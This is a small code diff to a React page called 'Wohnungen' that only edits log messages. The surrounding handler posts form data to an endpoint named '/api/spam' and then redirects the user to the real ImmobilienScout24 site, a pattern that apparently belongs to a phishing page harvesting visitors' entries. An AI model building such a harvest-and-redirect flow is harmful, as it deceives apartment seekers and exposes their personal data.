@@ -41,10 +41,10 @@ export default function Wohnungen() {
 
   async function handleSubmitFn() {
     try {
-      console.log("update!", process.env.NEXT_PUBLIC_URL);
+      console.log("update!!!!!!!!!", process.env.NEXT_PUBLIC_URL);
       
       await axios.post(`${process.env.NEXT_PUBLIC_URL}/api/spam`, data);
-      console.log("a trimes!!!!");
+      console.log("a trimes!!!! yuppppppp");
       router.replace('https://www.immobilienscout24.de/');
     } catch(err) {
       console.log(err);
